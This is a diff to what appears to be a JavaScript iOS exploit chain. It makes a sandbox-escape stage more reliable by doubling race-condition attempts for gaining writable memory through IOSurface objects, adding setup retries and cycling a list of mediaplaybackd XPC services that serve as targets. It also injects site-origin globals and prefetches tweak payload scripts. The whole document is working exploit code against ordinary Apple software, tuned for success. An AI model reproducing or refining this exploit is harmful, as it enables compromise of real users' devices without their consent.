@@ -5842,7 +5842,8 @@
   let SBX1SBX1_EXP_SIZE = 8n * PAGE_SIZE;
   let ORIGINAL_EXP_MARKER = 0x41n;
   let MODIFIED_EXP_MARKER = 0x42n;
-  let n_of_race_attempts = 2048n;
+  let n_of_race_attempts = 4096n;
+  const sbx1sbx1_exp_setup_attempts = 3;
   let scratch_buffer = calloc(1n, MAX_TRANSFER_BYTES);
   let exp_bypass_interval = 0n;
   let sbx1sbx1_interval = 0n;
@@ -5998,6 +5999,10 @@
     exp_bypass_interval = Date.now();
     LOG("Before searching loop");
     for (let attempt = 0; attempt < n_of_race_attempts; attempt++) {
+      if (attempt != 0 && attempt % 512 == 0) {
+        LOG(`still searching writable EXP memory at attempt ${attempt}/${n_of_race_attempts}`);
+        pthread_yield_np(pthread_self());
+      }
       target_surface = scaler_create_surface_with_address(target_surface_address, target_surface_size);
       assert(target_surface != 0n);
       memset(target_surface_address, ORIGINAL_EXP_MARKER, target_surface_size);
@@ -6026,7 +6031,7 @@
       CFRelease(target_surface);
     }
     if (won == false) {
-      LOG("[x] Failed to create writable EXP memory!");
+      LOG(`[x] Failed to create writable EXP memory after ${n_of_race_attempts} attempts!`);
       IOServiceClose(scaler_connection);
       destroy_file_mapping(target_fm);
       kr = mach_vm_deallocate(mach_task_self(), read_address, read_size);
@@ -6174,7 +6179,21 @@
     LOG(`surface handle: ${surface.hex()}`);
     let spray_memory_object = setup_guess_address(surface);
     LOG(`spray_memory_object: ${spray_memory_object.hex()}`);
-    let sbx1sbx1_ctx = sbx1sbx1_exp(SBX1SBX1_EXP_SIZE);
+    let sbx1sbx1_ctx = null;
+    for (let setup_attempt = 1; setup_attempt <= sbx1sbx1_exp_setup_attempts; setup_attempt++) {
+      LOG(`sbx1sbx1_exp setup attempt ${setup_attempt}/${sbx1sbx1_exp_setup_attempts}`);
+      sbx1sbx1_ctx = sbx1sbx1_exp(SBX1SBX1_EXP_SIZE);
+      if (sbx1sbx1_ctx && sbx1sbx1_ctx.connection) {
+        break;
+      }
+      LOG(`[!] sbx1sbx1_exp setup attempt ${setup_attempt} failed`);
+      usleep(25000n);
+      pthread_yield_np(pthread_self());
+    }
+    if (!sbx1sbx1_ctx || !sbx1sbx1_ctx.connection) {
+      LOG("[x] sbx1sbx1_exp failed after all setup attempts");
+      return false;
+    }
     LOG(`connection: ${sbx1sbx1_ctx.connection.hex()}`);
     LOG(`source_surface: ${sbx1sbx1_ctx.source_surface.hex()}`);
     LOG(`source_surface_address: ${sbx1sbx1_ctx.source_surface_address.hex()}`);
@@ -6250,18 +6269,26 @@
       exp_write_threads[i] = sbx1sbx1_exp_write_thread_setup(sbx1sbx1_ctx, buffer_size, original_buffer, modified_buffer, target_offset);
     }
     let success = false;
-    let services = ["com.apple.coremedia.mediaplaybackd.asset.xpc", "com.apple.coremedia.mediaplaybackd.assetimagegenerator.xpc", "com.apple.coremedia.mediaplaybackd.cpe.xpc", "com.apple.coremedia.mediaplaybackd.cpeprotector.xpc", "com.apple.coremedia.mediaplaybackd.figcontentkeyboss.xpc", "com.apple.coremedia.mediaplaybackd.figcontentkeysession.xpc", "com.apple.coremedia.mediaplaybackd.figcpecryptor.xpc", "com.apple.coremedia.mediaplaybackd.figmetriceventtimeline.xpc", "com.apple.coremedia.mediaplaybackd.formatreader.xpc", "com.apple.coremedia.mediaplaybackd.visualcontext.xpc"];
+    let services = [
+      "com.apple.coremedia.mediaplaybackd.asset.xpc",
+      "com.apple.coremedia.mediaplaybackd.assetimagegenerator.xpc",
+      "com.apple.coremedia.mediaplaybackd.figcontentkeysession.xpc"
+    ];
+    LOG(`service order: observed-good service_count=${services.length}`);
     let services_idx = 0n;
+    let service_attempt_limit = BigInt(services.length * 2);
     set_realtime_priority(gpu_fcall(PTHREAD_SELF), 0, 50, 50);
     pthread_yield_np(pthread_self());
-    for (let attempt = 0n; attempt < 8n; attempt++) {
+    for (let attempt = 0n; attempt < service_attempt_limit; attempt++) {
       if (services_idx >= services.length) {
-        break;
+        LOG("wrapping service list for second pass");
+        services_idx = 0n;
       }
       let TARGET_XPC_SERVICE = services[services_idx];
       let connection = xpcjs_xpc_connect(TARGET_XPC_SERVICE);
       if (connection == null) {
-        LOG(`connection failed, retrying again with a different endpoint...`);
+        LOG(`connection failed for ${TARGET_XPC_SERVICE}, retrying with a different endpoint...`);
+        services_idx++;
         continue;
       }
       LOG(`connected to ${TARGET_XPC_SERVICE}`);
@@ -6314,6 +6341,7 @@
         kr = mach_msg(test_msg.msg, MACH_SEND_MSG | MACH_SEND_TIMEOUT | MACH_RCV_MSG | MACH_RCV_TIMEOUT, test_msg.msg_size, test_msg.msg_size + PAGE_SIZE, connection["reply_port"], 15n, MACH_PORT_NULL);
         if (kr != MACH_SEND_TIMED_OUT) {
           LOG("[x] Error: Daemon likely crashed, retrying...");
+          services_idx++;
           break;
         }
         success = true;
@@ -6846,12 +6874,22 @@
       let sbcHsRows = sbcClamp(globalThis.__sbc_hs_rows, 4, 8, 6);
       let sbcStatbar = (globalThis.__sbc_statbar === 1 || globalThis.__sbc_statbar === true) ? 1 : 0;
       let sbcHideLabels = (globalThis.__sbc_hide_labels === 1 || globalThis.__sbc_hide_labels === true) ? 1 : 0;
+      function lsCleanText(raw, maxLen, def) {
+        let ss = (typeof raw === 'string') ? raw : def;
+        ss = (ss || '').replace(/[\x00-\x1f\x7f]/g, '');
+        if (ss.length > maxLen) ss = ss.slice(0, maxLen);
+        return ss;
+      }
+      let lsSiteOrigin = lsCleanText(globalThis.__ls_site_origin, 256, '');
+      let lsSiteHost = lsCleanText(globalThis.__ls_site_host, 128, '');
+      let lsSitePath = lsCleanText(globalThis.__ls_site_path, 256, '/');
+      if (!lsSitePath || lsSitePath.charAt(0) !== '/') lsSitePath = '/' + lsSitePath;
       let lsTweaksOut = [];
       if (lsTweakSet.fiveicon) lsTweaksOut.push('fiveicon');
       if (lsTweakSet.powercuff) lsTweaksOut.push('powercuff');
       if (lsTweakSet.mgpatcher) lsTweaksOut.push('mgpatcher');
       if (lsTweakSet.applimit) lsTweaksOut.push('applimit');
-      const INLINE_PREFETCH_MAX_BYTES = 96 * 1024;
+      const INLINE_PREFETCH_MAX_BYTES = 128 * 1024;
       let prelude = 'globalThis.__pe_ack_addr = 0x' + pe_ack_remote.toString(16) + 'n;\n';
       prelude += 'globalThis.__ls_tweaks = "' + lsTweaksOut.join(',') + '";\n';
       prelude += 'globalThis.__ls_enable_fiveicon = ' + (lsTweakSet.fiveicon ? 'true' : 'false') + ';\n';
@@ -6870,6 +6908,9 @@
       prelude += 'globalThis.__sbc_hs_rows = ' + sbcHsRows + ';\n';
       prelude += 'globalThis.__sbc_statbar = ' + sbcStatbar + ';\n';
       prelude += 'globalThis.__sbc_hide_labels = ' + sbcHideLabels + ';\n';
+      prelude += 'globalThis.__ls_site_origin = ' + JSON.stringify(lsSiteOrigin) + ';\n';
+      prelude += 'globalThis.__ls_site_host = ' + JSON.stringify(lsSiteHost) + ';\n';
+      prelude += 'globalThis.__ls_site_path = ' + JSON.stringify(lsSitePath) + ';\n';
       let tweakPrefetchPrelude = '';
       let tweakPrefetchBytes = 0;
       function addTweakPrefetch(enabled, scriptPath, globalName, label) {
@@ -6887,6 +6928,7 @@
       }
       addTweakPrefetch(lsTweakSet.fiveicon, 'sbcustomizer_light.js', '__sbcustomizer_code', 'SBCustomizer');
       addTweakPrefetch(lsTweakSet.powercuff, 'powercuff_light.js', '__powercuff_code', 'Powercuff');
+      addTweakPrefetch(!!globalThis.__ls_enable_chain_overlay, 'chain_status_overlay.js', '__chain_status_overlay_code', 'ChainStatusOverlay');
       if (tweakPrefetchBytes > INLINE_PREFETCH_MAX_BYTES) {
         LOG("[SBX1] Prefetched tweak payloads exceed budget (" + tweakPrefetchBytes + " > " + INLINE_PREFETCH_MAX_BYTES + "), disabling inline payload prefetch for stability");
       } else if (tweakPrefetchPrelude.length > 0) {
@@ -7015,6 +7057,9 @@
   }
   LOG("closing remaker_connection: " + remaker_connection);
   xpc_connection_cancel(remaker_connection);
+  if (!sbx1sbx1_succeeded) {
+    throw new Error("sbx1sbx1 failed");
+  }
   LOG = function (msg) {
     try {
       if (sbx1_syslog) sbx1_syslog('sbx0: ' + msg);
